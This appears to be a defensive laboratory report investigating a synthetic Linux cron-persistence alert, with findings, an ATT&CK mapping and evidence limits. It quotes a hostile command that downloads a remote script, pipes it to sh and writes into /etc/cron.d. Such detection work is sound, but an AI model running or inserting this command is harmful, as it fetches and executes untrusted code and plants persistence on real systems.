# CASE-009 — Linux Security Incident Investigation

## Investigation Summary

This laboratory investigation examines `ALERT-CASE-009-DET-LINUX-001`, generated by `DET-LINUX-001` after synthetic Linux telemetry contained multiple indicators associated with suspicious cron persistence activity.

The investigation determines whether the observed telemetry is consistent with suspicious persistence behavior while maintaining a strict evidence boundary.

## Alert Validation

- Alert ID: `ALERT-CASE-009-DET-LINUX-001`
- Detection ID: `DET-LINUX-001`
- Detection: Suspicious Linux Cron Persistence Detection
- Detection version: `1.0`
- Severity: High
- Confidence: High
- Supporting event: `EVT-009001`
- Host: `lab-linux-02`
- User: `analyst`

The alert was generated because `EVT-009001` contained three independent indicators:

1. `cron_persistence_path`
2. `shell_download_execution`
3. `hidden_or_tmp_payload`

The configured minimum indicator threshold is two.

## Initial Investigation Hypothesis

The initial hypothesis is:

> The observed activity is consistent with an attempt to establish Linux cron-based persistence using a shell command that retrieves and executes a payload.

This is an investigation hypothesis rather than a confirmed compromise conclusion.

## Evidence Reviewed

### EVT-009001 — Suspicious Activity

At `2026-09-09 13:00:00 UTC`, the `bash` process associated with user `analyst` executed:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update

The event referenced the cron persistence path:

/etc/cron.d/system-update

The event metadata also contained:

hidden_payload: true

The detection therefore identified three indicators:

cron_persistence_path
shell_download_execution
hidden_or_tmp_payload

The event generated:

ALERT-CASE-009-DET-LINUX-001

with High severity and High confidence.

EVT-009002 — Benign Comparison

At 2026-09-09 13:01:00 UTC, user admin performed:

crontab -e

against:

/var/spool/cron/crontabs/admin

This event did not trigger DET-LINUX-001.

The event provides a useful benign comparison because it demonstrates that ordinary interactive cron administration is not automatically classified as suspicious by the current detection logic.

Detection Logic Assessment

The detection requires at least two suspicious indicators before generating an alert.

For EVT-009001, three indicators were observed:

Cron persistence path
Shell-based download and execution
Hidden payload context

The event therefore exceeded the configured threshold and generated one alert.

For EVT-009002, the observed crontab -e administrative activity did not produce enough suspicious indicators to trigger the rule.

The supplied evidence therefore demonstrates the intended distinction between suspicious multi-indicator activity and ordinary cron administration within this laboratory fixture.

Investigation Findings

The available telemetry supports the following findings:

Finding 1 — Suspicious Cron Persistence Indicators

EVT-009001 referenced /etc/cron.d/system-update, which is a cron persistence location monitored by the detection.

Finding 2 — Shell-Based Payload Retrieval and Execution

The command line contained:

curl http://203.0.113.80/payload.sh | sh

This represents a shell pipeline that attempts to retrieve content and pass it directly to sh.

The telemetry demonstrates that this command was recorded. It does not independently prove that the remote content was successfully retrieved or that the resulting payload executed successfully.

Finding 3 — Hidden Payload Context

The event metadata contained:

hidden_payload: true

This contributed the third suspicious indicator used by the detection.

Finding 4 — Benign Administrative Activity

EVT-009002 recorded crontab -e activity by user admin.

The event did not trigger the detection, providing a benign comparison for ordinary cron administration.

MITRE ATT&CK Assessment

The detection maps the observed behavior to:

Tactic: Persistence
Technique: T1053.003
Name: Cron

The mapping is appropriate as an investigative classification for the observed cron-related persistence indicators.

The ATT&CK mapping does not independently establish that persistence was successfully achieved.

Evidence Validation

Evidence Boundary

The available evidence does not establish:

successful retrieval of the referenced payload;
successful execution of the retrieved payload;
successful creation or activation of the cron persistence mechanism;
malware classification;
host compromise;
attacker identity;
attacker attribution;
persistence duration;
lateral movement;
data access or exfiltration;
or real-world impact.

These conclusions would require additional evidence.

Recommended Validation Steps

For a real authorized investigation, analysts would validate:

The contents of /etc/cron.d/system-update.
The file creation and modification timestamps.
Whether the cron configuration was accepted and loaded by the cron service.
Process execution telemetry associated with curl, wget, sh, or related interpreters.
Network telemetry associated with the referenced destination.
DNS and connection history for the referenced destination.
File hashes and static analysis of any retrieved payload.
Process ancestry and execution history on lab-linux-02.
Authentication and privilege activity involving user analyst.
Additional persistence mechanisms on the affected laboratory host.

These are recommended investigative actions only. The corresponding evidence is not represented as existing in this case.

Investigation Conclusion

The available synthetic evidence is consistent with suspicious Linux cron persistence activity and justifies the generated High-severity alert.

The detection successfully distinguished the suspicious multi-indicator event from the supplied benign administrative cron activity.

However, the available evidence is insufficient to conclude that persistence was successfully established, that the payload executed successfully, that malware was present, or that the host was compromised.

The appropriate laboratory disposition is:

Suspicious activity confirmed; compromise not established from available evidence.

Further host, file, process, network, and cron-configuration evidence would be required to move beyond this assessment.

Detection Improvement Opportunities

The investigation identifies several useful areas for future detection engineering:

Correlate cron-file modification with subsequent process execution.
Correlate downloaded files with file hashes and malware-analysis results.
Correlate suspicious cron changes with network activity.
Add validation for unusual cron locations and ownership.
Consider user, host, and process context when assessing suspicious cron activity.
Add tests for slow or distributed persistence activity.
Add tests for benign administrative cron modifications.
Preserve supporting event IDs for all correlated evidence.

These improvements should be implemented only after confirming their requirements and validating their behavior with additional laboratory telemetry.

Laboratory Boundary

This investigation uses synthetic telemetry in an authorized defensive laboratory environment.

It does not represent a production incident, real victim, real credential, or real-world compromise.

All conclusions are limited to the evidence contained in the CASE-009 laboratory fixture.
